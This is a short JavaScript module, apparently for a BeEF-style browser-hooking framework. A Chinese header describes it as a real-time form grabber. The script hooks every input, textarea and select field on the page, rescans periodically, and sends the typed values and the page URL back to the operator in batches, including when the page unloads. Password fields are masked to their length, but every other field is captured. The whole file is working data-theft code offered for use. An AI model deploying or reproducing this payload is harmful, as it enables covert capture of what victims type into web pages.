// MODULE = {"desc": "表单实时监听:页面所有 input 输入即时批量回传(BeEF Form Graber)", "category": "信息收集", "params": [["interval", "批量回传间隔ms,默认 8000"]]}
(function () {
  var buf = [];
  function capture(el) {
    var name = el.name || el.id || '';
    var v = el.value || '';
    if (el.type === 'password') { v = '****(' + v.length + 'chars)'; }
    if (!name && !v) { return; }
    buf.push(name + '=' + v);
    if (buf.length >= 50) { flush(); }
  }
  function listen(el) {
    try { el.addEventListener('input', function () { capture(el); }); } catch (e) {}
  }
  function scan() {
    var els = document.querySelectorAll('input,textarea,select');
    for (var i = 0; i < els.length; i++) {
      if (!els[i]._fg) { els[i]._fg = 1; listen(els[i]); }
    }
  }
  function flush() {
    if (!buf.length) { return; }
    var data = buf.join(' | ');
    buf = [];
    report({ type: "form", url: location.href, fields: data.slice(0, 2000) });
  }
  scan();
  setInterval(scan, 3000);
  var iv = parseInt("{{interval}}", 10) || 8000;
  if (iv > 0) { setInterval(flush, iv); }
  window.addEventListener('beforeunload', flush);
})();
